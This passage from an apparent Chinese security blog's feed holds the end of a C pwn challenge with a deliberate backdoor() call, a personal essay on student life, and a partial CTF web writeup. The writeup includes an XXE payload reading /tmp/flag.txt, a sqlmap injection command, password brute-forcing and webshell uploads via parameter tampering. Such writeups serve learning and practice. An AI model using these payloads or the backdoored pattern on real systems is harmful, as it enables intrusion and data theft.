number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    corr_id <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span>id_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">memset</span><span class="token punctuation">(</span>corr_id<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>id_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>corr_id<span class="token punctuation">,</span> id_len<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          expr_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    expr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span>expr_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">memset</span><span class="token punctuation">(</span>expr<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>expr_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>expr<span class="token punctuation">,</span> expr_len<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>key_len<span class="token operator">+</span>id_len<span class="token operator">+</span>expr_len<span class="token operator">!=</span>length<span class="token number">-12</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token comment" spellcheck="true">// æ‰§è¡Œè¿ç®—</span>          res <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">memset</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          status <span class="token operator">=</span> <span class="token function">calc</span><span class="token punctuation">(</span>expr<span class="token punctuation">,</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>status <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          skey <span class="token operator">=</span> key<span class="token punctuation">;</span>          s_corr_id <span class="token operator">=</span> corr_id<span class="token punctuation">;</span>          s_res <span class="token operator">=</span> res<span class="token punctuation">;</span>          it_find <span class="token operator">=</span> mq<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>skey<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>it_find<span class="token operator">!=</span>mq<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// å…¥é˜Ÿ</span>            d<span class="token punctuation">.</span>corr_id <span class="token operator">=</span> s_corr_id<span class="token punctuation">;</span>            d<span class="token punctuation">.</span>res <span class="token operator">=</span> s_res<span class="token punctuation">;</span>            mq<span class="token punctuation">[</span>skey<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> done_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">else</span>          <span class="token punctuation">{</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">4</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">// close </span>          <span class="token keyword">return</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">// break;</span>        <span class="token keyword">case</span> <span class="token number">6</span><span class="token punctuation">:</span>          <span class="token function">backdoor</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>                  <span class="token keyword">default</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">// error</span>          <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  MQ mq<span class="token punctuation">;</span>  <span class="token function">handle</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">,</span> mq<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><blockquote><p>ä»Šå¤©å°±æ°´åˆ°è¿™å„¿å§ğŸ˜­ã€‚ã€‚</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;ä½¿ç”¨Dockerè¿›è¡ŒPwné¢˜ç¯å¢ƒéƒ¨ç½²&quot;&gt;&lt;a href=&quot;#ä½¿ç”¨Dockerè¿›è¡ŒPwné¢˜ç¯å¢ƒéƒ¨ç½²&quot; class=&quot;headerlink&quot; title=&quot;ä½¿ç”¨Dockerè¿›è¡ŒPwné¢˜ç¯å¢ƒéƒ¨ç½²&quot;&gt;&lt;/a&gt;ä½¿ç”¨Dockerè¿›è¡ŒPwné¢˜ç¯å¢ƒéƒ¨ç½²&lt;
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="ç¯å¢ƒéƒ¨ç½²" scheme="http://www.yof3ng.xyz/tags/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    
  </entry>
  
  <entry>
    <title>Some_words_of_today</title>
    <link href="http://www.yof3ng.xyz/2018/10/29/Some-words-of-today/"/>
    <id>http://www.yof3ng.xyz/2018/10/29/Some-words-of-today/</id>
    <published>2018-10-29T15:03:45.000Z</published>
    <updated>2018-10-29T15:46:20.970Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Some-words-of-today"><a href="#Some-words-of-today" class="headerlink" title="Some_words_of_today"></a>Some_words_of_today</h1><blockquote><p>ä»Šæ—¥ä»½é—²æ‰¯ã€‚ğŸ™ƒ</p></blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; ç°åœ¨æ—¶é—´å·²ç»23:06äº†ï¼Œä»Šå¤©ç»™å‡ ä½å­¦å¼Ÿç®€å•è®²äº†ä¸€äº›å°çŸ¥è¯†ï¼ˆè™½ç„¶è‡ªå·±å¾ˆlowï¼Œä½†å¸Œæœ›å­¦å¼Ÿå¯ä»¥å¾ˆå¼ºï¼‰ï¼Œå†™å®Œè¿™ç¯‡æ°´æ–‡å°±ç¡å§ã€‚ä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™å¼€å§‹å°±å·²ç»ä¹ æƒ¯äº†è¿™ä¹ˆæ™šç¡ï¼Œè™½ç„¶çŸ¥é“æ™šç¡å•¥çš„ï¼Œç†¬å¤œä»€ä¹ˆçš„å¯¹èº«ä½“ä¸å¥½balabalaï¼Œä½†æ˜¯ç”Ÿæ´»æ‰€è¿«ï¼Œè¢«ç”Ÿæ´»å®‰æ’çš„æ˜æ˜ç™½ç™½ï¼Œè™½ç„¶ç›®å‰å›½å†…è®¡ç®—æœºè¡Œä¸šç°çŠ¶å¦‚ä¸‹å›¾ï¼š</p><p><img src="https://i.loli.net/2018/10/29/5bd722c007501.png" alt=""></p><p>æŠ‘æˆ–æ˜¯å¦‚ä¸‹å›¾ï¼š</p><p><img src="https://i.loli.net/2018/10/29/5bd72383adca2.png" alt=""></p><p>&nbsp; &nbsp; &nbsp; &nbsp; åˆšå…¥å­¦é‚£ä¼šå„¿ï¼Œå¤§å­¦å˜›ï¼Œæ†§æ†¬çš„æ˜¯å•¥ï¼Ÿæ— éå°±æ˜¯åƒå–ç©ä¹ï¼Œäº¤æœ‹å‹ï¼ˆæ‰¾å¥³ç¥¨ï¼Ÿï¼‰ä»¥åŠå°‘éƒ¨åˆ†å­¦ä¹ ã€‚å¯¹å•Šï¼Œå°±æ˜¯è¿™æ ·æ²¡é”™å•Šï¼Œå¤§å®¶éƒ½æ˜¯è¿™ä¹ˆè®¤ä¸ºçš„å˜›ï¼Œä¸€ç›´åˆ°å¤§ä¸€è¿‡å»ä¸€å¤§åŠï¼Œæˆ‘ä¹Ÿæ˜¯å­¦å­¦åœåœï¼Œç©ç©æ¸¸æˆï¼Œ<del>ä»¥åŠä¸€åœºèµ·äºé«˜ä¸­ï¼Œæ­¢äºå¤§ä¸€æœ«ï¼Œç»å†è¿‡ä¸€èµ·ï¼Œä¹Ÿç»å†è¿‡åˆ†ç¦»ï¼Œè¿˜ç»å†è¿‡å¼‚åœ°ï¼Œåƒç”µè§†å‰§ä¸€æ ·çš„æ‹çˆ±</del>,å‘¸å‘¸å‘¸ ã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; å¾ˆæ™®éçš„ä¸€ä¸ªç°è±¡æ˜¯ï¼šå¾ˆå¤šåˆšè¸å…¥å¤§å­¦æ ¡é—¨çš„äººï¼Œå°±æƒ³å¼€å§‹æ¥ä¸€åœºè½°è½°çƒˆçƒˆçš„æ‹çˆ±ï¼Œæ¥é‡Šæ”¾è‡ªå·±çš„å¤©æ€§ï¼Œæ‹¥æŠ±å¿ƒä¸­çš„ç¾å¥½ğŸ˜„ï¼Œåˆ°åæ¥å´å¾€å¾€æ˜¯æœ€åˆå¼€å§‹çš„äººèµ°ä¸åˆ°ä¸€å—å„¿ã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; æˆ–è®¸å¾—åˆ°äº†ä»€ä¹ˆä¸œè¥¿ï¼Œå°±è¯¥å¤±å»ç‚¹å¦å¤–çš„ä»€ä¹ˆä¸œè¥¿ã€‚æ‰€ä»¥é‚£æ®µæ—¶é—´æˆ‘åªæ˜¯ç”Ÿæ´»åœ¨ä¸€ä¸ªå°åœˆå­é‡Œï¼Œè™½ç„¶é”™è¿‡äº†å¾ˆå¤šå¾ˆå¤šçš„ç²¾å½©ï¼Œè™šåº¦äº†äº›è®¸æ—¶æ—¥ï¼Œä½†ä¹Ÿæˆé•¿äº†è®¸å¤šã€‚ç»å†äº†ç§ç§åï¼Œæˆ‘æ‰é€æ¸æ˜ç™½æˆ‘çš„å¤§å­¦ç”Ÿæ´»ï¼Œä¹ƒè‡³äººç”Ÿæ„ä¹‰æ‰€åœ¨ğŸ˜¥ï¼Œé£èŠ±é›ªæœˆä¸è¿‡å¶å°”ï¼Œè‡ªå¼ºä¸æ¯ä¾¿æœ‰è¿œæ–¹ã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; æ‰€è°“å¤§å­¦è€…ï¼Œéè°“æœ‰å¤§æ¥¼ä¹‹è°“ä¹Ÿï¼Œæœ‰å¤§å¸ˆä¹‹è°“ä¹Ÿï¼Œä½†æ˜¯ç°åœ¨åˆæœ‰å‡ ä¸ªèƒ½åšåˆ°ï¼Ÿã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ä¸å…¶å¥¢æœ›å¹³å°å¦‚ä½•å¦‚ä½•å¸®è‡ªå·±ï¼Œé‚£ä¸ºä½•ä¸â€œå¤©è¡Œå¥ï¼Œå›å­ä»¥è‡ªå¼ºä¸æ¯â€å‘¢ï¼Ÿ</p><p>&nbsp; &nbsp; &nbsp; &nbsp; å¤§å­¦åªæ˜¯ä¸€ä¸ªå¹³å°ï¼Œä¸€ä¸ªç»™ä½ å»ç”Ÿæ´»ï¼Œå»å±•ç¤ºï¼Œå»å®ç°ï¼Œå»åˆ›é€ ï¼Œå»ä½“éªŒç¤¾ä¼šçš„å°ç©ºé—´ã€‚å½“ç„¶ï¼Œå¯èƒ½æŸäº›äººè¿›å…¥å¤§å­¦ä¹‹åï¼Œå•Šæˆ‘çš„å¤§å­¦æ€ä¹ˆæ€ä¹ˆæ ·ï¼Œæ€ä¹ˆæ€ä¹ˆæƒ¨ï¼ŒæŠ±æ€¨èµ„æºä¸å…¬ï¼Œå“€å¹ç¤¾ä¼šå¦‚ä½•ï¼Œç„¶åè½¬èº«åˆæ‰‘è¿›äº†æ¸¸æˆä¸–ç•Œã€‚æƒ³æƒ³å…¶å®ä¹ŸæŒºå‚»çš„ï¼Œä¸å…¬èƒ½æ€æ ·ï¼Ÿè°è®©è‡ªå·±æä¸äº†ä¸€ä¸ªå¥½å¹³å°ï¼Œè°è®©è‡ªå·±å¾—ä¸åˆ°é‚£ç‚¹ä»…æœ‰çš„èµ„æºï¼Œåˆæ˜¯è°åœ¨ä¸€æ¬¡ä¸€æ¬¡å •è½ä¹‹åç»§ç»­å •è½ï¼Ÿé‚£è‚¯å®šæ˜¯è‡ªå·±å’¯ğŸ˜­ã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; æ‰€ä»¥å¦‚æœè‡ªå·±ä¸å»å®ç°ä¸€ç‚¹èƒ½å¤Ÿå®ç°çš„ä»·å€¼ï¼Œæ¥å°è¯ä¸€ä¸‹è‡ªå·±çš„èƒ½åŠ›ï¼Œé‚£å¦‚ä½•æ‰èƒ½è·å¾—é‚£æ‰€è°“çš„å…¬å¹³ï¼Œå¦‚ä½•å»èå…¥ä½ æ‰¹åˆ¤ï¼Œå“€å¹çš„é‚£ä¸ªç¤¾ä¼šã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; æœªæ¥ä¹‹è·¯è™½ç„¶åå·ï¼Œä½†å¸Œæœ›ä¸è¯¸ä½åŒè¡Œä¹‹äººï¼Œå…±åŒå‰è¿›ã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; Publish by Yof3ng.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Some-words-of-today&quot;&gt;&lt;a href=&quot;#Some-words-of-today&quot; class=&quot;headerlink&quot; title=&quot;Some_words_of_today&quot;&gt;&lt;/a&gt;Some_words_of_today&lt;/h1&gt;&lt;bloc
      
    
    </summary>
    
      <category term="æ‚æ–‡" scheme="http://www.yof3ng.xyz/categories/%E6%9D%82%E6%96%87/"/>
    
    
      <category term="æ‚æ–‡" scheme="http://www.yof3ng.xyz/tags/%E6%9D%82%E6%96%87/"/>
    
  </entry>
  
  <entry>
    <title>wandoucup-ctf</title>
    <link href="http://www.yof3ng.xyz/2018/10/28/wandoucup-ctf/"/>
    <id>http://www.yof3ng.xyz/2018/10/28/wandoucup-ctf/</id>
    <published>2018-10-28T06:01:54.000Z</published>
    <updated>2018-10-29T05:35:15.486Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="wandoucup-ctf"><a href="#wandoucup-ctf" class="headerlink" title="wandoucup-ctf"></a>wandoucup-ctf</h1><blockquote><p>è¿™ä¸¤å¤©åœ¨æ‰“ä¸€ä¸ªç¨å¾®ç®€å•çš„CTFï¼Œå†™ä¸ªwriteupè®°å½•ä¸€ä¸‹è¢«è™çš„è¿‡ç¨‹ğŸ˜­ï¼Œæ€»çš„æ¥è¯´è¿™åœºå°èµ›æ˜¯ä¸ªå¤§æ‚çƒ©ï¼Œæ¯•ç«Ÿä½ æ‡‚çš„ğŸ˜ï¼Œä½œä¸ºåšé¢˜è€…æˆ‘ä»¬å½“ç„¶æ˜¯æœ‰é¢˜åšå°±okçš„ã€‚</p><p>ç”±äºæ¯”èµ›åç¯å¢ƒå…³é—­ï¼Œæ‰€ä»¥æœ‰çš„æ— å›¾ç‰‡å±•ç¤ºï¼Œç°æœ‰çš„å›¾ç‰‡æ˜¯ä¸‹åˆå°±å‡†å¤‡å†™writeupæˆªçš„å›¾ã€‚</p></blockquote><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="web1-ç­¾åˆ°é¢˜"><a href="#web1-ç­¾åˆ°é¢˜" class="headerlink" title="web1-ç­¾åˆ°é¢˜"></a>web1-ç­¾åˆ°é¢˜</h3><p><a href="http://101.231.137.47:20001/" target="_blank" rel="noopener">é¢˜ç›®é“¾æ¥</a></p><blockquote><p>è·ŸæŸå‡ ä¸ªctfç»ƒä¹ å¹³å°ä¸Šé¢çš„æ»‘ç¨½é¢˜ä¸€æ ·ï¼š</p><p><img src="https://i.loli.net/2018/10/28/5bd55a6403431.png" alt=""></p></blockquote><p>ä¸€é”®è·å–flagğŸ˜„ã€‚</p><h3 id="web2-è¾“å…¥å¯†ç æŸ¥çœ‹flag"><a href="#web2-è¾“å…¥å¯†ç æŸ¥çœ‹flag" class="headerlink" title="web2-è¾“å…¥å¯†ç æŸ¥çœ‹flag"></a>web2-è¾“å…¥å¯†ç æŸ¥çœ‹flag</h3><p><a href="http://101.231.137.47:20002/4.php" target="_blank" rel="noopener">é¢˜ç›®é“¾æ¥</a></p><blockquote><p>ç®€å•æµè§ˆä¸€ä¸‹ï¼Œå°±æ˜¯ä¸€ä¸ªçˆ†ç ´çš„é¢˜ï¼š</p><p><img src="https://i.loli.net/2018/10/28/5bd56b3b1d5b7.png" alt=""></p><p>å¯†ç ä¸ºäº”ä½æ•°ï¼Œé‚£æˆ‘ä»¬ç›´æ¥ä¸Šburpsuiteå’¯ï¼šè®¾ç½®é•¿åº¦å’Œpayloadå­—ç¬¦ï¼š</p><p><img src="https://i.loli.net/2018/10/28/5bd56b9a814dd.png" alt=""></p><p><img src="https://i.loli.net/2018/10/28/5bd590f273c5b.png" alt=""></p><p>GET FLAG!</p></blockquote><h3 id="web3-è¿™çœŸèƒ½ä¼ é©¬ï¼Ÿ"><a href="#web3-è¿™çœŸèƒ½ä¼ é©¬ï¼Ÿ" class="headerlink" title="web3-è¿™çœŸèƒ½ä¼ é©¬ï¼Ÿ"></a>web3-è¿™çœŸèƒ½ä¼ é©¬ï¼Ÿ</h3><p><a href="http://101.231.137.47:20003/" target="_blank" rel="noopener">é¢˜ç›®é“¾æ¥</a></p><blockquote><p>ç®€å•åœ°æŠ“åŒ…ä¿®æ”¹å‚æ•°ï¼Œä»è€Œä½¿å¾—è‡ªå·±èƒ½å¤Ÿä¼ phpï¼Œæˆ‘ç›´æ¥ä¸Šäº†ä¸€ä¸ªå¤§é©¬ï¼Œç„¶åçœ‹/opt/flag.txtã€‚</p><p><img src="https://i.loli.net/2018/10/28/5bd56d1fde396.png" alt=""></p><p>æŠ“åŒ…å¯ä»¥çœ‹åˆ°urlä¸­çš„extå‚æ•°ä¼ é€’çš„æ˜¯æ–‡ä»¶ç±»å‹ï¼ŒçŒœæµ‹æ˜¯å¯ä»¥ä¿®æ”¹ï¼Œæˆ‘ä»¬åŠ ä¸ªphpåˆ°ä¸­é—´å³å¯æˆåŠŸåœ°ç›´æ¥ä¸Šä¼ webshellï¼ˆå¾ˆæŠ è„šï¼‰ã€‚</p><p><img src="https://i.loli.net/2018/10/28/5bd56da602535.png" alt=""></p><p>ç„¶åå†ä¿®æ”¹ä¸€ä¸‹content-typeå³å¯ï¼š</p><p><img src="https://i.loli.net/2018/10/28/5bd56ea016a98.png" alt=""></p></blockquote><p>To /opt/flag.txt  get flag==&gt;ğŸ˜„</p><p><img src="https://i.loli.net/2018/10/28/5bd56ef831e0e.png" alt=""></p><h3 id="web4-è¿™çœŸèƒ½æ³¨å…¥ï¼Ÿ"><a href="#web4-è¿™çœŸèƒ½æ³¨å…¥ï¼Ÿ" class="headerlink" title="web4-è¿™çœŸèƒ½æ³¨å…¥ï¼Ÿ"></a>web4-è¿™çœŸèƒ½æ³¨å…¥ï¼Ÿ</h3><p>é¢˜ç›®é“¾æ¥</p><blockquote><p>æµè§ˆä¸€ä¸‹ï¼ŒåŠ ä¸ªå•å¼•å·è¯•è¯•å°±ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„æ³¨å…¥å’¯ï¼š</p><p><img src="https://i.loli.net/2018/10/28/5bd56f5203775.png" alt=""></p><p>ç›´æ¥sqlmapæ³¨å…¥å³å¯ï¼Œ<code>sqlmap -u http://101.231.137.47:20004/php/index.php?gid=1 --dbs</code></p><p>å¾—åˆ°æ•°æ®åº“ååç›´æ¥é€æ­¥æŒ‡å®šæ•°æ®åº“è¡¨ï¼ŒæŒ‡å®šå­—æ®µï¼Œdumpå³å¯ã€‚</p><p>ç”±äºæ¯”èµ›åæœåŠ¡å·²ç»å…³é—­æ•…æœªèƒ½æˆªå–æˆåŠŸå›¾ç‰‡ã€‚</p></blockquote><h3 id="web5-API"><a href="#web5-API" class="headerlink" title="web5-API"></a>web5-API</h3><blockquote><p>è¿™é¢˜æ˜¯xxeå¤–éƒ¨å®ä½“æ³¨å…¥ï¼Œé€šè¿‡æŠ“åŒ…ï¼Œä¿®æ”¹POSTæ•°æ®ä»¥åŠContent-typeä»è€Œè¯»å–åˆ°/tmp/flag.txtã€‚</p><blockquote><p>XXEæ¼æ´å°±æ˜¯æœåŠ¡å™¨æ¥å—ä»å®¢æˆ·ç«¯å‘é€æ¥çš„xmlæ ¼å¼æ•°æ®æ—¶ï¼Œxmlæ•°æ®ä¸­æ¶æ„çš„å¼•ç”¨äº†å¤–éƒ¨å®ä½“ï¼Œå°†å®ƒçš„å€¼ç»‘å®šä¸ºæœåŠ¡å™¨çš„ç›®æ ‡æ–‡ä»¶ï¼Œè¿™æ ·åœ¨æœåŠ¡å™¨è¿”å›ç»™æˆ‘ä»¬è§£æåçš„å€¼æ—¶ï¼Œå°±ä¼šæŠŠç›®æ ‡æ–‡ä»¶çš„å†…å®¹è¿”å›ç»™æˆ‘ä»¬ï¼Œä»è€Œè¯»å–æ•æ„Ÿæ–‡ä»¶å†…å®¹ã€‚</p></blockquote><p>é¢˜ç›®åŸæœ¬ä¼ è¾“çš„<code>Content-type: application/json</code>æ”¹ä¸º<code>Content-type: application/xml</code>ï¼Œå¹¶å°†POSTçš„æ•°æ®æ”¹ä¸ºä»¥ä¸‹xmlä»£ç :</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version=â€1.0â€³?></span><span class="token doctype">&lt;!DOCTYPE a[&lt;!ENTITY xxe SYSTEM â€œfile:///tmp/flag.txtâ€></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>something</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>something</span><span class="token punctuation">></span></span></code></pre><p>ç„¶åå‘é€æ•°æ®åŒ…ï¼Œå°±å¯å¾—åˆ°apiè¿”å›çš„flagäº†ã€‚</p></blockquote><h3 id="web6-sweet-home"><a href="#web6-sweet-home" class="headerlink" title="web6-sweet home"></a>web6-sweet home</h3><blockquote><p>è¿™é“é¢˜æœ‰ç‚¹ä¸œè¥¿ï¼Œä¸€æ­¥ä¸€æ­¥æ·±å…¥ï¼Œåˆ°æœ€åä¸€ä¸ªæç¤ºæ”¾å‡ºä¹‹åå‡ åˆ†é’Ÿï¼Œè¿…é€Ÿæ‹¿åˆ°flagã€‚</p><p>æ­¥éª¤ï¼šç™»å½•å’Œæ³¨å†Œç•Œé¢éœ€è¦å†™è„šæœ¬æŠ›å‡ºå¯¹åº”è§„åˆ™çš„codeï¼Œç„¶åé€šè¿‡ç›®å½•éå†å¾—åˆ°éƒ¨åˆ†é¡µé¢æºç ä»¥åŠä¸€ä¸ªç›®å½•(åˆ†åˆ«æ˜¯<code>user.php~</code>ï¼Œ <code>config.php~</code>ï¼Œ<code>adminpic</code>)ï¼Œæ ¹æ®æºç å¯ä»¥å¾—çŸ¥adminpicæ˜¯adminç”¨æˆ·ä¸Šä¼ æ–‡ä»¶çš„ä¸€ä¸ªç›®å½•ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥å¾—åˆ°æ•°æ®åº“è´¦å·å¯†ç ï¼Œå…¨ç«¯å£æ‰«æå¾—åˆ°23306ç«¯å£ä¸ºæ•°æ®åº“æœåŠ¡ç«¯å£ï¼Œç™»é™†åå¾—åˆ°adminè´¦æˆ·å¯†ç ï¼Œç»è¿‡å¤§åŠå¤©çš„ç ´è§£md5ä¹‹åï¼Œå¾—åˆ°æç¤º<code>crypto.html</code>ï¼Œè¿™æ˜¯ä¸€ä¸ªæŒ‡å®šçš„è§£å¯†md5çš„é¡µé¢ï¼Œè¾“å…¥adminå¯†ç hashå€¼ç ´è§£å¾—åˆ°æç¤º<code>crypto.png</code>ï¼Œè®¿é—®å¾—åˆ°äºŒç»´ç ï¼Œæ‰«æå³å¯è·å¾—å¯†ç <code>wandouxueyuan:)</code>ï¼Œç”¨æ­¤å¯†ç å¯ç™»å½•adminè´¦æˆ·ï¼Œæ¥åˆ°ä¸Šä¼ å›¾ç‰‡publishé¡µé¢ï¼Œç»“åˆå‰é¢éå†å¾—åˆ°çš„ä¸€ä¸ª<code>adminpic</code>ç›®å½•å¯ä»¥çŸ¥é“ä¸Šä¼ æ–‡ä»¶åœ¨æ­¤ç›®å½•ä¸­ï¼Œç»è¿‡ç®€å•çš„ç»•è¿‡åä¸Šä¼ å¤§é©¬å³å¯ã€‚</p><p>å‚»å‚»çš„æˆ‘è¿˜å°è¯•æ–‡ä»¶åŒ…å«ï¼Œsession_decodeï¼Œä»¥åŠregisteræ³¨å†Œç­‰ç­‰æ“ä½œã€‚</p><p><img src="https://i.loli.net/2018/10/28/5bd5d5ba033c9.png" alt=""></p></blockquote><p><img src="https://i.loli.net/2018/10/28/5bd5a2a3dd284.png" alt=""></p><p>ä¼ å®Œé©¬åè®¿é—®/adminpicç›®å½•å³å¯çœ‹åˆ°è‡ªå·±ä¸Šä¼ 